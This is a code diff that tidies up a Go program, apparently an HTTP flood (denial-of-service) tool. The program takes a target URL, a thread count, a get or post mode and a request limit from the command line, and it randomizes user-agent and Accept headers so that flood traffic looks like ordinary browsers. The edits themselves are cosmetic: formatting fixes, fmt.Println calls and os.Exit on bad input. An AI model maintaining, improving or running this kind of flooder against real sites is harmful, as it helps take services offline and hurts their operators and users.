@@ -46,7 +46,8 @@ var (
 		"Accept: text/html, application/xhtml+xml",
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
+	}
 	key     string
 	choice  = []string{"Macintosh", "Windows", "X11"}
 	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
@@ -84,8 +85,8 @@ var (
 func init() {
 	rand.Seed(time.Now().UnixNano()) //fixed seed problem
 }
-func getuseragent() string {
 
+func getuseragent() string {
 	platform := choice[rand.Intn(len(choice))]
 	var os string
 	if platform == "Macintosh" {
@@ -175,7 +176,6 @@ func flood() {
 					header += string(a) + "\r\n"
 				}
 			}()
-
 		} else {
 			data = "f"
 		}
@@ -232,7 +232,8 @@ func main() {
 	}
 	u, err := url.Parse(os.Args[1])
 	if err != nil {
-		println("Please input a correct url")
+		fmt.Println("Please input a correct url")
+		os.Exit(1)
 	}
 	tmp := strings.Split(u.Host, ":")
 	host = tmp[0]
@@ -246,17 +247,19 @@ func main() {
 	}
 	page = u.Path
 	if os.Args[3] != "get" && os.Args[3] != "post" {
-		println("Wrong mode, Only can use \"get\" or \"post\"")
-		return
+		fmt.Println("Wrong mode, Only can use \"get\" or \"post\"")
+		os.Exit(1)
 	}
 	mode = os.Args[3]
 	threads, err := strconv.Atoi(os.Args[2])
 	if err != nil {
 		fmt.Println("Threads should be a integer")
+		os.Exit(1)
 	}
 	limit, err := strconv.Atoi(os.Args[4])
 	if err != nil {
 		fmt.Println("limit should be a integer")
+		os.Exit(1)
 	}
 	if contain(page, "?") == 0 {
 		key = "?"
